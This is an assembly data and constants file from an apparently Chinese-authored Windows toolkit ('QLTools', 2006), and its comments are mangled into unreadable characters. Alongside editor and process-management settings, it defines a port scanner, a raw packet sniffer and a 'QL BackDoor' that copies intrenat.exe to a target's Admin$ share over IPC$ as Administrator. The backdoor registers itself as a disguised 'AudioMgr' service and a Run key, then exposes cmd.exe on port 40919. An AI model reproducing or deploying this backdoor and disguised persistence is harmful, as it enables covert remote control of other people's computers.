;------------------------
; ���С����for NT
; ��Ҫ������
; �����ƣ����أ���ϵͳ�Զ�����
; �����б��������С������ض��򡢽��̹���
; �������ڹ���(���ء����֡��ر�ָ������),ͨ����ݼ�����ָ������
; ��ǰ���Ŷ˿�����̹���
; ϵͳģ���б�
; ��̨�������IE���������,ϵͳ�Զ���¼���ã�������Ŀ����
; ������Ա༭�����롢���ӡ����л���������͸������ctrl+alt+u,ctrl_alt+dΪ����/����͸���ȣ�����͸�����ڲο���һ�㴰�ڵ�Դ����
; ������رգ���������
; ���޳�¼��������
;---------------------
; �Ự����
; �����ά������б�
; �����û��б������û��б�Ĭ��Ϊ�գ�
; IP��������Ĭ��Ϊ�գ�������û��б�Ĭ��Ϊ���У�
; �����б�
;--------------------- 
; �˿�ɨ��
; TELNET���ų���
; ��Ļ��׽��Զ�̼��
; ���绽��
;
; �ļ��������,������¼���ʼ�����
; �����������ӣ�Զ�̿������������ӹ���
;
; ����   
; 2006.3.8-?��ʱ����
;------------------------
    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc
include    user32.inc
include    kernel32.inc
include    gdi32.inc
include    comctl32.inc
include    comdlg32.inc
include    advapi32.inc
include    shell32.inc
include    masm32.inc
include    netapi32.inc
include    winmm.inc
include    ws2_32.inc
include    psapi.inc
include    mpr.inc        ;WNetCancelConnection2
include    iphlpapi.inc   ;SendARP
includelib comctl32.lib
includelib comdlg32.lib
includelib gdi32.lib
includelib user32.lib
includelib kernel32.lib
includelib advapi32.lib
includelib shell32.lib
includelib masm32.lib
includelib netapi32.lib
includelib winmm.lib
includelib ws2_32.lib
includelib psapi.lib
includelib mpr.lib
includelib iphlpapi.lib

PROCESSDLG_KILL   equ     4111h
IDC_PROCESS       equ     4112h
IDC_REFRESH       equ     4113h
IDC_PROCESS_MODEL equ     4114h

ICO_MAIN        equ       1000h
IDB_TOOLBAR1    equ       1001h
IDB_TOOLBAR2    equ       1002h
IDB_TIGER       equ       1003h
IDB_BOY         equ       1012h
IDB_GIRL        equ       1013h
IDB_MANAGER     equ       1016h
IDB_ALL         equ       1017h

IDM_MAIN        equ       2000h
IDA_MAIN        equ       2000h

;�ļ�
IDM_NEW         equ       4101h
IDM_OPEN        equ       4102h
IDM_SAVE        equ       4103h
IDM_SAVEAS      equ       4104h
IDM_PRINT       equ       4105h
IDM_PAGESETUP   equ       4106h
IDM_EXIT        equ       4107h
;�༭
IDM_UNDO        equ       4201h
IDM_REDO        equ       4202h
IDM_SELALL      equ       4203h
IDM_COPY        equ       4204h
IDM_CUT         equ       4205h
IDM_PASTE       equ       4206h
IDM_GO          equ       4207h
IDM_FIND        equ       4208h
IDM_REPLACE     equ       4209h
IDM_FINDPREV    equ       4210h
IDM_FINDNEXT    equ       4211h
;��ʾ
IDM_SETFONT     equ       4301h
IDM_SETCOLOR    equ       4302h
IDM_INACT       equ       4303h
IDM_GRAY        equ       4304h
IDM_BIG         equ       4305h
IDM_SMALL       equ       4306h
IDM_LIST        equ       4307h
IDM_DETAIL      equ       4308h
IDM_TOOLBAR     equ       4309h
IDM_TOOLBARTEXT equ       4310h
IDM_INPUTBAR    equ       4311h
IDM_STATUSBAR   equ       4312h
IDM_TRANSPARENT equ       4313h
;�������ӹ���
IDM_RES         equ       4401h
IDM_COMPILE     equ       4402h
IDM_LINK        equ       4403h
IDM_RUN         equ       4404h
IDM_COMPILEALL  equ       4405h

;���̹�����
IDM_TERMINATE   equ       4501h
IDM_EXECUTE     equ       4502h
IDM_IPPORT      equ       4503h
IDM_TOPWINDOW   equ       4504h
IDM_MODULE      equ       4505h
IDM_REGISTRY    equ       4506h
IDM_SHUTDOWN    equ       4507h
IDM_REBOOT      equ       4508h

;����Ƶ����
IDM_AUDIOSTART  equ       7601h
IDM_AUDIOPAUSE  equ       7602h
IDM_AUDIOSTOP   equ       7603h
IDM_AUDIOPLAY   equ       7604h

;���繤��
IDM_CHATSERVER   equ       8001h
IDM_CHATCLIENT   equ       8002h
IDM_PORTSCAN     equ       8003h
IDM_FTPSERVER    equ       8004h
IDM_FTPCLIENT    equ       8005h
IDM_TELNETSERVER equ       8006h
IDM_HTTPFILTER   equ       8007h

;����
IDM_HELP        equ       5001h
IDM_ABOUT       equ       5102h

;���г���
DLGExec_MAIN    equ       4120h
ID_BROWSE       equ       4121h
ID_RUN          equ       4122h
ID_EXIT         equ       4123h
ID_TEXT         equ       4124h
ID_RESULT       equ       4126h
ID_CONSOLE      equ       4127h

;���̹�����������
PROCESSDLG_TOPWIN  equ    4131h
IDC_CLOSEWIN       equ    4132h
IDC_REFRESHW       equ    4133h
IDC_WINTABLE       equ    4134h
IDC_TOPWINHIDE     equ    4135h
IDC_TOPWINSHOW     equ    4136h

;����͸����
VIEWDLG_TRANSPARENT equ   5200h
IDC_TRANSPARENT     equ   5201h
IDC_TRANSPARENTOK   equ   5202h


;���̹���ģ��
PROCESSDLG_MODULE  equ    4141h
IDC_MODULELIST     equ    4142h
IDC_REFRESHM       equ    4143h
IDC_MODULETABLE    equ    4144h

;ת����
GOTODLG            equ    4151h
IDC_LINENUMBER     equ    4152h
IDC_GOTOLINE       equ    4153h
IDC_CANCLE         equ    4154h

;ϵͳ���ã�������Ŀ
REGDLG_STARTUP     equ    4161h
IDC_STARTUPTABLE   equ    4162h
IDC_STARTUPDEL     equ    4163h
IDC_STARTUPRESH    equ    4164h

;ϵͳ���ã�IE����
REGDLG_IE          equ    4171h
IDC_SETIEADDR      equ    4172h
IDC_DISABLEIEADDR  equ    4173h
IDC_RESETIE        equ    4174h
IDC_IEADDR         equ    4175h
IDC_DISABLEPROXY   equ    4176h
IDC_USEPROXY       equ    4177h
IDC_IEGROUP        equ    4178h
IDC_STATICIE1      equ    4179h
IDC_STATICIE2      equ    4611h
IDC_PROXYIP        equ    4612h
IDC_PROXYPORT      equ    4613h
IDC_SETPROXY       equ    4614h


;ϵͳ���ã�ϵͳ����
REGDLG_SERVICE     equ    4181h
IDC_SERVICETABLE   equ    4182h
IDC_SERVICEDEL     equ    4183h
IDC_SERVICESTOP    equ    4184h
IDC_SERVICERUN     equ    4185h
IDC_SERVICERESH    equ    4186h

;ϵͳ���ã��Զ���¼
REGDLG_AUTOLOGIN   equ    4191h
IDC_LOGINENABLED   equ    4192h
IDC_LOGINLIST      equ    4193h
IDC_LOGINUSERNAME  equ    4194h
IDC_LOGINPASSWORD  equ    4195h
IDC_AUTOLOGIN      equ    4196h
IDC_STATICLOGIN1   equ    4197h
IDC_STATICLOGIN2   equ    4198h
IDC_LOGINGROUP     equ    4199h
IDC_STATICLOGIN3   equ    4601h
IDC_LOGINDOMAIN    equ    4602h

;ϵͳ���ã�������˿ڵ�Ӱ��
PROCESSDLG_IPPORT  equ    4701h
IDC_PORTTABLE      equ    4702h
IDC_REFRESHPORT    equ    4703h
IDC_CLOSEPORT      equ    4704h
IDC_PORTOFF        equ    4705h

;���繤��-�Ự������
NET_CHATSERVER     equ    4801h
IDC_CHATUSERS      equ    4802h
IDC_FILTERWINDOW   equ    4803h
IDC_CHATOBJECT     equ    4804h
IDC_CHATMESSAGE    equ    4805h
IDC_SENDMESSAGE    equ    4806h
IDC_PRIVACY        equ    4807h
IDC_TOTALUSERS     equ    4808h
IDC_KICKDOWN       equ    4809h
IDC_APPLYMIC       equ    4810h
IDC_SETFILTER      equ    4811h
IDC_DISABLEIP      equ    4812h
IDC_MUTENOW        equ    4813h
IDC_BROADCAST      equ    4814h
IDC_STOPSERVICE    equ    4820h

;����Ự���Ự�ͻ���
NET_CHATCLIENT       equ    4901h
IDC_SERVERIP         equ    4902h
IDC_NICKNAME         equ    4903h
IDC_SEXY             equ    4904h
IDC_CONNECTTOSERVER  equ    4905h
IDC_PUBLICMESSAGE    equ    4907h
IDC_PRIVACYMESSAGE   equ    4908h
IDC_MICSONLINE       equ    4909h
IDC_CHATTO           equ    4910h
IDC_SENDCONTENTS     equ    4911h
IDC_PRIVACYTALK      equ    4912h
IDC_TALKMESSAGE      equ    4913h
IDC_TOTALUSER        equ    4914h
IDC_USERSLIST        equ    4915h

;�˿�ɨ��
NET_PORTSCAN         equ    6000h
IDC_IP               equ    6001h
IDC_FROMIP           equ    6002h
IDC_TOIP             equ    6003h
IDC_RETRIES          equ    6004h
IDC_STARTSCAN        equ    6005h
IDC_STOPSCAN         equ    6006h
IDC_SCANRESULT       equ    6007h
IDC_SCANSUBPROCESS   equ    6008h
IDC_SCANPROCESS      equ    6009h
IDC_SINGLEPORT       equ    6010h
IDC_MULTIPORT        equ    6011h
IDC_ESINGLEPORT      equ    6012h
IDC_EMULTIPORTMIN    equ    6013h
IDC_EMULTIPORTMAX    equ    6014h

;TELNET�������
NET_TELNETSERVER     equ    5300h
IDC_LOCALHOST        equ    5301h
IDC_REMOTEHOST       equ    5302h
IDC_REMOTEIP         equ    5303h
IDC_REMOTEPORT       equ    5304h
IDC_REMOTEUSER       equ    5305h
IDC_REMOTEPASS       equ    5306h
IDC_INSTALLBACKDOOR  equ    5307h
IDC_REMOVEBACKDOOR   equ    5308h

;IP���ݰ���׽
NET_IPFILTER         equ    5400h
IDC_STARTCAPTURE     equ    5401h
IDC_FILTERTABLE      equ    5402h
IDC_TOTALRECEIVED    equ    5403h
IDC_TOTALDEALED      equ    5404h
IDC_FILTERCONTENT    equ    5405h
IDC_SAVETOFILE       equ    5406h
IDC_BUFFERPROCESS    equ    5407h
IDC_FILTERPORT       equ    5408h

ID_TOOLBAR      equ       1
ID_PTOOLBAR     equ       2
ID_EDIT         equ       10
ID_EDIT1        equ       11
ID_STATUSBAR    equ       20

HOT_CTRL_ALT_ENTER  equ   9090h ;ȫ���ȼ�ctrl+alt+n
HOT_CTRL_ALT_H      equ   9091h ;���ص�ǰ����ctrl+alt+h
HOT_CTRL_ALT_ADD    equ   9092h ;��ǰ����͸����ctrl+alt+u
HOT_CTRL_ALT_SUB    equ   9093h ;��ǰ����͸����ctrl+alt+d



MAX_SOCKET          equ   100   ;���������
WM_SOCKET           equ   WM_USER+100
WM_SOCKETCLIENT     equ   WM_USER+101
WM_PORTSCANFINISHED equ   WM_USER+102
CHAT_TCP_PORT       equ   55555 ;TCP�Ի��˿�

F_RUNNING       equ       0001h ;������������
F_CONSOLE       equ       0001h ;����Ϊ����̨�����н�����ʾ��
CHAR_BLANK      equ       20h   ;����ո���������������
CHAR_DELI       equ       '"'   ;����ָ���

BUFFER_SIZE     equ       1024
MAX_BUFFER_SIZE      equ    30*1024*1024
MAX_DWBUFFER_SIZE    equ    1*1024*1024  ;������ݰ�����

TOTAL_SERVICE_STRU   equ   sizeof ENUM_SERVICE_STATUS

;���Ҷ˿�ӳ���ϵʹ�õ����ݽṹ
NT_HANDLE_LIST           equ  16
OBJECT_TYPE_SOCKET_2K    equ  1ah       ;2000��Ϊ1ah,xp��Ϊ1ch
OBJECT_TYPE_SOCKET_XP    equ  1ch
OBJECT_TYPE_SOCKET_2003  equ  1eh       
OBJECT_TYPE_SOCKET_VISTA equ  20h

WS_EX_LAYERED            equ  80000h
LWA_ALPHA                equ  2h 

IOC_IN	                  equ  80000000h
IOC_VENDOR               equ  18000000h

WSA_FLAG_OVERLAPPED      equ  1
IP_HDRINCL               equ  2
SIO_RCVALL               equ  98000001h

CONNECT_INTERACTIVE      equ  8

MAX_HANDLE_LIST_BUF    equ  200000h  ;2M�ռ�
HANDLEINFO STRUCT
  dwPid                  word ?
  CreatorBackTraceIndex  word ?
  ObjType                byte ?
  HandleAttributes       byte ?
  HndlOffset             word ?
  dwKeObject             dword ?
  GrantedAccess          dword ?
HANDLEINFO ENDS

PROCESSDATA STRUCT
  hProcess               dword ?
  dwProcessId            dword ?
  next                   dword ?
PROCESSDATA ENDS
SESSIONDATA STRUCT
  hPipe                  dword ?
  sClient                dword ?
SESSIONDATA ENDS

;�Զ���ѹ��λͼͷ���ṹ
QLHeader  STRUCT
  flag      dword   ?   ;��ʶ"QiLi"
  w         word    ?   ;λͼ����
  h         word    ?   ;λͼ�߶�
  off       dword   ?   ;ѹ��������ʼλ��
  len       dword   ?   ;ѹ�����ݳ���
QLHeader  ENDS

;������ɫƵ��ͳ��ʱʹ�õ�һ���ṹ
RGBFrequency  STRUCT
  b         byte    ?
  g         byte    ?
  r         byte    ?
  count     dword   ?
RGBFrequency  ENDS

;����������ݽṹ
tcp_hdr  STRUCT
  source  word  ?  ;04-0E   Դ��ַʹ�õĶ˿ڣ�ת��Ϊʮ����Ϊ1038
  dest    word  ?  ;04-D2   Ŀ�Ļ�ʹ�õĶ˿ڣ�ת��Ϊʮ����Ϊ1234
  seq     dword ?  ;DD-0C-75-FC ˳����
  ack_seq dword ?  ;00-00-00-00 ȷ�ϱ��
  extra   word  ?  ;70-02  70������01110000��ǰ��λ0111��ʾTCP��ͷ��32λ�ֵı�ţ�����λ�Ǳ����ֶΣ�����λ����TCP�ı�־λ�ֶΡ�
  window  word  ?  ;FF-FF   ���ڴ�С����ʾ���ͷ��������������ݵ��ֽ���
  check   word  ?  ;BB-7F   ��ͷУ���
  urg_ptr word  ?  ;00-00  ��TCP��ѡ��
                   ;�ٸ��ŵľ���������,��Ҳ���Բ�Ҫ����,�������С��TCP���ݱ�
tcp_hdr  ENDS

macAddress STRUCT
  byte1   BYTE    ?
  byte2   BYTE    ?
  byte3   BYTE    ?
  byte4   BYTE    ?
  byte5   BYTE    ?
  byte6   BYTE    ?
macAddress ENDS

magic_pkt STRUCT
  destMac db 6 dup(0FFh) ;������FF����ʾ�㲥��
  dest    macAddress 16 dup(<>)  
magic_pkt ENDS

;WINDOWNS.INC���Ѷ���
;ip_hdr STRUCT
;  ip_hlv    BYTE      ?  45
;  ip_tos    BYTE      ?  00��������Ϊһ������
;  ip_len    WORD      ?  00-3C IP���ݱ��ܳ���
;  ip_id     WORD      ?  2F-46��ʶ���ֶ�
;  ip_off    WORD      ?  00-00 ��־λ�Ͷ�ƫ��
;  ip_ttl    BYTE      ?  80��Чʱ��
;  ip_p      BYTE      ?  06Э������,��ʾTCP
;  ip_cksum  WORD      ?  9F-B7��ͷУ���
;  ip_src    DWORD     ?  0A-79-2B-63 Դ��ַ;
;  ip_dest   DWORD     ?  0A-79-2B-6F Ŀ��IP��ַ
;ip_hdr ENDS


send_ip  STRUCT
  ip   ip_hdr  <>
  tcp  tcp_hdr <>
send_ip  ENDS

;���յ������ݰ�������
recv_tcp STRUCT
  ip       ip_hdr  <>
  tcp      tcp_hdr <>
  buffer   db 65535 dup (?) 
recv_tcp ENDS

;���ⱨͷ+TCP��,��������У���
pseudo_hdr  STRUCT
  source_address dword   ?  ;ԴIP��ַ
  dest_address   dword   ?  ;Ŀ��IP��ַ
  placeholder    byte    ?  ;Ĭ��Ϊ0
  protocol       byte    ?  ;Э������,�����TCP,��Ϊ6,UDPΪ17
  tcp_length     word    ?  ;TCP���ݱ�����(������)
  tcp            tcp_hdr <> ;TCP���ݱ�
pseudo_hdr  ENDS


_PROCVAR2   typedef  proto :DWORD,:DWORD,:DWORD,:DWORD
PROCVAR2    typedef  ptr _PROCVAR2
RGB MACRO red,green,blue
  xor eax,eax
  mov ah,blue
  shl eax,8
  mov ah,green
  mov al,red
ENDM

     .data
szProcessFileName    db  'ntsd -c q -p '  ;��ѡ����szPID���ɷ���
szPID                db  256 dup(0)
szFileNameOpen       db  MAX_PATH dup(0)
szFileNameOpen1      db  MAX_PATH dup(0)  ;"*.asm"
szFileNameOpenBack   db  MAX_PATH  dup(0) ;"*.obj"
szFileNameOpenBack1  db  MAX_PATH  dup(0) ;"*.res"
szFileNameOpenBack2  db  MAX_PATH  dup(0) ;"*.rc"
szExcute	db	'ִ��(&E)',0		;��ť����
szKill		db	'��ֹ(&E)',0
szExcuteError	db	'����Ӧ�ó������',0


szTitleOpen	db	"Open executable file...",0
szExt		db	'*.exe',0
szFilter	db	'Excutable Files',0,'*.exe;*.com',0
		db	0

SelectCard         dd  ?,?,?,?  ;ѡ������
hApplyButton       dd  ?        ;Ӧ�ó���ť
lpszSheetStartup   db  '������Ŀ����',0
lpszSheetIE        db  'IE���������',0 
lpszSheetService   db  'ϵͳ����',0
lpszSheetAutoLogin db  '�Զ���¼',0
lpszSheetName      db  'ϵͳ����ʵ�ó���',0

lpszStartupType1   db  'Run',0
lpszStartupType2   db  'RunOnce',0
lpszStartupType3   db  'RunOnceEx',0
lpszStartupType4   db  'RunService',0
lpszStartupType5   db  'RunOnceService',0
lpszStartupType6   db  'Startup',0
lpszStartupType7   db  'Win',0
lpszStartupType8   db  'System',0

lpszRemoteComputer db  '\\127.0.0.1\IPC$',0

dwSZ                dd   00418CBEh
lpszKey             db   'SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN',0  ;test
lpszValueName       db   'intrenat',0  ;test
lpszValue           db   '\system32\intrenat.exe',0   ;test
lpszExeName         db   '\intrenat.exe',0
lpszSzType          db   'REG_SZ',0
lpszDwordType       db   'REG_DWORD',0

lpszAddr            db  'http://www.ljdx.com',0   ;test
lpszMainPageKey     db  'SOFTWARE\MICROSOFT\INTERNET EXPLORER\MAIN',0  ;test
lpszMainPageName    db  'Start Page',0  ;test

lpszDisableRegKey   db 'Software\Microsoft\Windows\CurrentVersion\Policies\System',0
lpszDisableRegName  db 'DisableRegistryTools',0

lpszDisIEAddrKey    db 'Software\Policies\Microsoft\Internet Explorer\Control Panel',0
lpszDisIEAddrName   db 'HomePage',0

lpszDisProxyKey     db 'Software\Policies\Microsoft\Internet Explorer\Control Panel',0
lpszDisProxyName    db 'Proxy',0
lpszDisProxySetKey  db 'Software\Microsoft\Windows\CurrentVersion\Internet Settings',0
lpszDisProxySetName db 'ProxyEnable',0
lpszDisProxySetV    dd 1
lpszProxyOverrideN  db 'ProxyOverride',0
lpszProxyOverrideV  db '10.*;<local>',0
lpszProxyServerN    db 'ProxyServer',0
lpszProxyServerV    db '10.115.47.183:808',0,0

lpszAutoLoginKey   db 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',0 
lpszDisAdminLogin  db 'AutoAdminLogon',0
lpszDefUser        db 'DefaultUserName',0
lpszDefPassword    db 'DefaultPassword',0
lpszDefDomain      db 'DefaultDomainName',0
lpszEnableAutoLog  db '1',0
lpszDisableAutoLog db '0',0


lpszExt          db  '.test',0
lpszExtDefKey    db  'testfile',0
lpszOpenKey      db  'testfile\shell\open\command',0
lpszOpenValue    db  '%SystemRoot%\system32\QLTools.exe %1',0

lpszServiceName  db  'AudioMgr',0
lpszServicePath  db  '%SystemRoot%\system32\intrenat.exe',0
lpszDisplayName  db  'AudioMgr',0

lpszServiceStatus1   db  '���ڼ���',0
lpszServiceStatus2   db  '������ͣ',0
lpszServiceStatus3   db  '��ͣ',0
lpszServiceStatus4   db  '����',0
lpszServiceStatus5   db  '��������',0
lpszServiceStatus6   db  '����ֹͣ',0
lpszServiceStatus7   db  'ֹͣ',0
lpszServiceStatus8   db  'δ֪',0
lpszServiceStatus9   db  '�ѽ���',0
lpszServiceProPath   db  '�в�֧��',0

;Socket����
lpszSockType0        db  'NUL',0
lpszSockType1        db  'TCP',0
lpszSockType2        db  'UDP',0
lpszSockType3        db  'RAW',0
lpszSockType4        db  'RDM',0
lpszSockType5        db  'SEQ',0
lpszNTDll            db  'ntdll.dll',0
lpszDllMethodName    db  'NtQuerySystemInformation',0
lpQuerySysInfo       PROCVAR2   ?
pdwHandleList        dd  ?
dwHandleInfo         dd  ?  ;��ȡHANDLEINFO�ṹ��ָ��
dwPortPID            dd  ?  ;��ž����Ӧ�Ľ��̺�

lpszUserLineInfo     db  80 dup(0) ;���һ���û��������3����
lpszUser             db  30 dup(0) ;����û���
lpFindFile           db  'c:\??????????????.wav',0

szFmtSubKey      db  '[�Ӽ�]%s',0dh,0ah,0
szFmtSz          db  '[��ֵ]%s=%s',0dh,0ah,0
szFmtDword       db  '[��ֵ]%s=%08x',0dh,0ah,0
szFmtValue       db  '[��ֵ]%s (��������)',0dh,0ah,0
szFindUserCmd    db  'net user',0

szRIFF           db  'RIFF',0
szTotalLength    dd  ?
szWAVE           db  'WAVE',0
szFMT            db  'fmt ',0
szWaveFormLength dd  sizeof WAVEFORMATEX
szDATA           db  'data',0
szWavDataLength  dd  ?
szWavSaveFile    db  256 dup(?)   ;WAV�ļ���



dwShareMode     dd   ?
hFile           dd   ?
hWavFile        dd   ?
hWaveIn         dd   ?
hExeFile        dd   ?  ;���н��̵��ļ����
dwCount         dd   ?  ;�滻�Ĵ���
hFileConsole    dd   ?  ;����ʹ�õ��ļ����
hCaret          dd   ? 
dwTableRow      dd   0  ;����к� 

dwTopWinLineIndex   dd   ?  ;���㴰�ڼ�¼��ǰѡ�е��к�
dwStartupLineIndex  dd   ?  ;��¼������Ŀ���ǰѡ���к�
dwServiceLineIndex  dd   ?  ;��¼��̨������ǰѡ���к�
dwPortLineIndex     dd   ?  ;������˿ڹ������ǰѡ�е��к�
hTerminateDialog    dd   ?  ;������ֹ�Ի���
hExecuteDialog      dd   ?  ;���г���Ի���

dwStatusWidth   dd  60,200,320,520,-1   ;����״̬�����������
dwMenuHelp      dd  0,IDM_NEW,0,0

fFindReplace    dd  0    ;0��ʾ���ң�1��ʾ�滻
fIsNewDoc       dd  1    ;1��ʾ�ļ�Ϊ�½�û�б�����
process_PE      PROCESSENTRY32 <sizeof PROCESSENTRY32>
process_ME      MODULEENTRY32 <sizeof MODULEENTRY32>
process_dpl     db  'SeDebugPrivilege',0  ;����Ȩ��
shutdown_dpl    db  'SeShutdownPrivilege',0  ;�ػ�Ȩ��


lpServicesBuffer db  1024*64 dup(0)  ;ϵͳ������̻�������ţ�ENUM_SERVICE_STATUS�ṹ����
lpService       ENUM_SERVICE_STATUS  <?>

dwScrWidth      dd  ?   ;��Ļ���
dwScrHeight     dd  ?   ;��Ļ�߶�
dwRecordIsPressed dd  0    ;¼����ť�Ƿ���

;�Ự��������ݽṹ
USERINFO  STRUCT   ;�û���Ϣ
       hSocket     dd  ?           ;04f9h
       userName   db  21 dup(?)    ;#00080
       sex        db  ?            ;1
       ip         db  16 dup(?)    ;10.115.47.183
       loginTime  db  9 dup(?)     ;04:12:13
       status     db  10 dup(?)    ;Ĭ�����Ϊ��������
USERINFO  ENDS


lpszSexA          db   '��',0
lpszSexB          db   'Ů',0
lpszToAll         db   '���',0
lpszTo            db   '��',0
lpszSay           db   '˵��',0
lpszSecSay        db   '���ĵ�˵��',0
lpszYou           db   '��',0
lpszCrLf          db   0dh,0ah,0
lpszServerIP      db   '10.115.47.171',0,0,0
lpszConnect       db   '�� ��',0
lpszDisConnect    db   '�� ��',0
lpszUsersHeader   db   '�����û��б�',0


lpOldTalkMessageProc  dd   ?  ;���������ı����Ĭ�ϴ��ڳ�����

lChatUsers        USERINFO MAX_SOCKET dup(<>)
lFilterUsers      dd   MAX_SOCKET dup(?)
lMuteUsers        dd   MAX_SOCKET dup(?)
lMicUsers         dd   MAX_SOCKET dup(?)
lDisabledIP       dd   MAX_SOCKET dup(15 dup(?))  ;����ֹ100��IP��ַ

dwTotalUsers      dd   ?   ;�û�����
dwFilterUsers     dd   ?   ;����û�����
dwMuteUsers       dd   ?   ;�����û�����
dwIPDisabled      dd   ?   ;IP����������
dwMicOrders       dd   ?   ;�����ϵ��û�

dwCurrentSelUser  dd   ?   ;��ǰ�û����б���е�˳��
dwPrivacyTalk     dd   ?   ;˽�ı�־�����Ϊ1��ʾ˽��
dwChatServerLineIndex dd  ?  ;������������ǰѡ����

dwInitTransparent dd   240  ;����͸����


szChatColName1    db  '���',0
szChatColName2    db  '�û���',0
szChatColName3    db  '�Ա�',0
szChatColName4    db  '״̬',0
szChatColName5    db  'IP��ַ',0
szChatColName6    db  '��¼ʱ��',0

szChatServerFmt   db  '[#%05d]',0
normal_Status     db  '����',0
hSocket           dd  ?
hClientSocket     dd  ?
hEvent            dd  ?
hClientChatWnd    dd  ?
hChatClientTable  dd  ?   ;�ͻ����û��б�
hImageList        dd  ?   ;�ͻ����û��б�ʹ�õ�ͼ���б�


szErrorToSelf         db  '���ܶ��Լ�˵��',0
szErrorBlankNickName  db  '�û��ǳƲ���Ϊ�գ�',0
szErrorBroadcast      db  '����Աͨ��',0
szErrorUserIsExist    db  'ָ�����û����Ѿ����ڣ����������',0
szErrorKickDown       db  '�Ѿ�������Ա�߳��Ự�ң�',0 
stSourceAddr      sockaddr_in <>
stDestAddr        sockaddr_in <>

NickNameMark   db    '@#@',0    ;����
MicOrderMark   db    '@$@',0    ;����
QuitMark       db    '@!@',0     ;�˳�
ToAllMark      db    '@*#@',0   ;�Դ��
PublicMark     db    '@*$@',0   ;����
PrivacyMark    db    '@*!@',0   ;˽��
BroadcastMark  db    '@##@',0   ;ͨ��

lpszTalker     db    20 dup(0)
bufDisplay     db    2000 dup(0)
bufRecv        db    1024 dup(0)
bufNickName    db    40 dup(0)
bufClientAdmin db    'ϵͳ����Ա',0
bufLocalIP     db    '127.0.0.1',0
bufBroadcast   db    '255.255.255.255',0


hPortScanDlg        dd    ?  ;�˿�ɨ�贰�ھ��
hPortScanTable      dd    ?
hPortScanSocket     dd    ?  ;������SOCKET
hRecvSocket         dd    ?  ;������SOCKET
hRecvEvent          dd    ?  ;�¼�������
dwPortStatus        dd    ?  ;�˿�״̬��1��ʾ�򿪣�2��ʾδ�򿪣�3��ʾ�����ػ��������쳣

dwPortScanLineIndex dd    0
dwSubProgressValue  dd    ?
dwProgressValue     dd    ?

lpszIP              db    '10.115.47.171',0
lpszOne             db    '1',0
lpszPortStatus1     db    '������',0
lpszPortStatus2     db    '��������',0
lpszPortStatus3     db    '�ػ�',0
lpszGetInfo         db    '����Ϣ',15 dup(0)

lpszPortScanCol1    db    'IP��ַ',0
lpszPortScanCol2    db    '�˿�',0
lpszPortScanCol3    db    '״̬',0
lpszPortScanCol4    db    'MAC��ַ',0
lpszPortScanCol5    db    '���Դ���',0


lpTest              db    45h,00h
                    db    00h,28h,01h,07h,40h,00h,80h,06h,00h,00h,0ah,79h,2bh,62h,0ah,79h
                    db    2bh,63h  ;IPͷ20���ֽڵ�У���

lpszLocalIP         db    16 dup(0)

arrPortScanStatus   dd    3 dup(?)   ;�˿�ɨ��״̬,IP��ַ,�˿�,״̬

sendBuffer          send_ip    <>
send_tcp            tcp_hdr     <>
pseudoHdr           pseudo_hdr  <>
recvBuffer          recv_tcp    <>

dwInitPort          dw    44448   ;�˿�ɨ��ʹ�õı��ض˿�
syn_timeout         dd    10000   ;��ʱʱ��us
bOptVal             BOOL  TRUE
dwLocalBindingPort  dd    44449   ;�����˿�
dwCurrentPort       dd    ?       ;��ǰ��˿�
dwPortScanFromIP    dd    ?
dwPortScanToIP      dd    ?
dwPortScanFromPort  dd    ?
dwPortScanToPort    dd    ?

bStopRecvPacket     dd    0       ;ֹͣ�������ݰ��ı�־
dwStopScan          dd    0       ;ֹͣɨ��
hRecvTimer          dd    ?       ;�������ݰ��Ķ�ʱ�����


lpszDisplay         db   'display',0
lpszBmpFile         db   'c:\2.bmp',0



;����Ŀ����̵�dacl��
SE_KERNEL_OBJECT     equ     0006h
GRANT_ACCESS         equ     0001h
SET_ACCESS           equ     0002h
NO_INHERITANCE       equ     0000h
NO_MULTIPLE_TRUSTEE  equ     0000h
TRUSTEE_IS_SID       equ     0000h
TRUSTEE_IS_NAME      equ     0001h
TRUSTEE_IS_USER      equ     0001h
TRUSTEE_IS_GROUP     equ     0002h
SECURITY_NT_AUTHORITY equ    0005h 

hServiceStatus       dd   ?     ;����״̬������
hMutex               dd   ?     ;�ź���
lpProcessDataHead    dd   ?     ;ָ�������������ͷ��ָ��
lpProcessDataEnd     dd   ?     ;ָ�������������β��ָ��

lpProcessFirst       PROCESSDATA     <>  ;��һ���������ݣ�����ͷ
serviceStatus        SERVICE_STATUS  <>
lpszBackDoorFmt1     db   '\\%s\Admin$\system32\intrenat.exe',0
lpszPreURL           db   '\\',0
lpszBackDoorFmt2     db   '%s%s',0
lpszBackDoorFmt3     db   '\\%s\IPC$',0
lpszCmd              db   '\cmd.exe',0
lpszNULL             db   'NULL',0
lpszInstallFail      db   '��װ����ʧ��!',0
lpszInstallOK        db   '�ѳɹ���װ����!',0
lpszRemoveOK         db   '�ѳɹ�ж�غ��ų���',0
lpszStartFail        db   '������̨����ʱ����',0
lpszErrorConnection  db   '����IPC$���ӳ���!',0
lpszAdminUser        db   'Administrator',40 dup(0),0   ;����IPC$�û���
lpszAdminPass        db   'NULL',50 dup(0)            ;����IPC$����
lpszDestHost         db   '10.115.47.221',15 dup(0)    ;Ŀ������
lpszDestPort         db   '40919',0
lpszOK               db   'all is ok!',0
dwTelnetPort         dd   40919
lpIPC                db   256 dup(0)          ;"\\10.121.43.100\IPC$"
lpszCMDHints1        db   0dh,0ah
                     db   0dh,0ah,09h,09h,'---[   QL BackDoor v1.0 beta, by qixiaorui   ]---'
                     db   0dh,0ah,09h,09h,'---[   E_MAIL:qixiaorui@163.com              ]---'
                     db   0dh,0ah,09h,09h,'---[   HomePage:                             ]---'
                     db   0dh,0ah,09h,09h,'---[   Date:09-01-2006                       ]---',0dh,0ah,0dh,0
lpszCMDHints2        db   0dh,0ah,'Escape Character is ',27h,'CTRL+]',27h,0dh,0ah,0dh,0
szShellBuffer        db   BUFFER_SIZE dup (0)
lpszExit             db   'exit',0ah,0dh,0
szWriteBuffer        db   0
dispatchTable        SERVICE_TABLE_ENTRY 2 dup(<>)  
szBufferTemp         db   'cd\',0ah,0dh       

hTelnetDlg           dd   ?  


dwHttpFilterBindingPort  dd  40920
dwDealedPackets          dd  0
dwReceivePackets         dd  0
dwReceiveTimeout         dd  100  ;���ݰ����ճ�ʱ,��λΪus
lpMaxBuffer              dd  ?   ;���ݰ������봦������
lpMaxDWBuffer            dd  ?
